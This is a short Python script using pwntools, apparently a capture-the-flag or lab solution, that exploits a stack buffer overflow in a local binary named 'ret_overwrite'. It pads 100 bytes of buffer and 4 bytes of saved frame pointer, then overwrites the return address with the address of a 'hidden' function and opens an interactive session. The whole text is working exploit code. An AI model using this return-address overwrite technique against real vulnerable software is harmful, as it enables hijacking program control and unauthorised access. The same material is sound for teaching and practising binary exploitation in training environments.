from pwn import*

p = process('./ret_overwrite')
elf = ELF('./ret_overwrite')

payload = 'A'*100 	#buf
payload += 'B'*4	#sfp
payload += p32(elf.symbols['hidden'])

p.sendline(payload)

p.interactive()
